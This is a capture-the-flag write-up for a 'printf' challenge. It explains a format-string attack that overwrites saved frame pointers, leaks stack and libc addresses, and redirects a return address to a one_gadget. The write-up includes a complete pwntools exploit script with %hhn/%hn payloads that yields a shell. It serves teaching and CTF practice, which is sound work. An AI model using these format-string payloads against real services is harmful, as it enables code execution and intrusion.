# printf

## Challenge

The challenge provides a single `printf` call on user input before exiting.
The user string is stored in the data section, so users cannot write their own addresses to the stack.

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Disassembly

```c
void sym.go(void) {
    sym.imp.fgets(obj.s, 0x100, _reloc.stdin);
    sym.imp.printf(obj.s);
    return;
}

void sym.set(void) {
    sym.go();
    return;
}

void sym.ready(void) {
    sym.set();
    return;
}

ulong main(void) {
    sym.imp.alarm(0x3c);
    sym.imp.setbuf(_reloc.stdout, 0);
    sym.imp.setbuf(_reloc.stdin, 0);
    sym.ready();
    return 0;
}
```

## Solution

Due to the nested function calls leading to the `printf` call, there is a number of stored RBP values on the stack.
By overwriting the least significant byte of one of these values, we can use it to write up to a word to any other value on the stack.

If we make this point at a return address, we can cause the program to return back into `main` to loop back to the vulnerable call.
This does require some luck.
These saved RBP values will always be aligned to 0x10 bytes, so we have to guess the most significant 4 bits of the byte still.
This gives us a 1/16 chance of getting a given value.
I believe that 2 values would work for the purpose of looping the program, which gives us closer to a 2/16 chance of succeeding.

We can combine this with some `%p` conversion specifiers to leak addresses in the first iteration, which will give us more control over what we can overwrite in subsequent iterations.
On the next iteration, we can overwrite any value on the stack to a value of our choosing, one word at a time.
The easiest thing I found, and what most other competitors did, was to replace the `libc_start_main_return` address with a one\_gadget.
If this was not an option though, it would also be possible to write a full ropchain here, though it may require multiple loops.

P.S.
I found out later that one competitor rented a nearby cloud VM, allowing them to write the one\_gadget in a single stage, which I found quite amusing.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

def write_word_on_stack(offset, word):
    payload = "%c%c%c%c"
    written = 4

    to_write = ((stack + 0x28 + offset) - written) % 0x100
    written += to_write
    payload += f"%{to_write}c%hhn"

    to_write = (word - written) % 0x10000
    written += to_write
    payload += f"%{to_write}c%hn"

    to_write = (0x44 - written) % 0x100
    written += to_write
    payload += f"%{to_write}c%hhn"

    io.sendline(payload.encode())

libc = ELF('libc-2.31.so')

io = start()

payload = "%c%c%c%c"
written = 4

to_write = (0x68 - written) % 0x100
written += to_write
payload += f"%{to_write}c%hhn"

to_write = (0x44 - written) % 0x100
written += to_write
payload += f"%{to_write}c%hhn"

payload += "<<<%6$p>>>"
payload += "<<<%13$p>>>"

io.sendline(payload.encode())

io.recvuntil(b'<<<')
stack = int(io.recvuntil(b'>>>', drop=True), 0)
io.info("STACK: " + hex(stack))

io.recvuntil(b'<<<')
libc.address = int(io.recvuntil(b'>>>', drop=True), 0) - libc.libc_start_main_return
io.info("LIBC: " + hex(libc.address))
io.info("GETS: " + hex(libc.sym['gets']))
io.info("RET: " + hex(libc.libc_start_main_return))

one_gadget = libc.address + 0xe3b01
write_word_on_stack(0, one_gadget)
write_word_on_stack(2, one_gadget >> 0x10)

io.sendline(b'')

io.interactive()
```

## Flag

```
maple{F0wm47_57w1ng_3xpl01t_UwU}
```
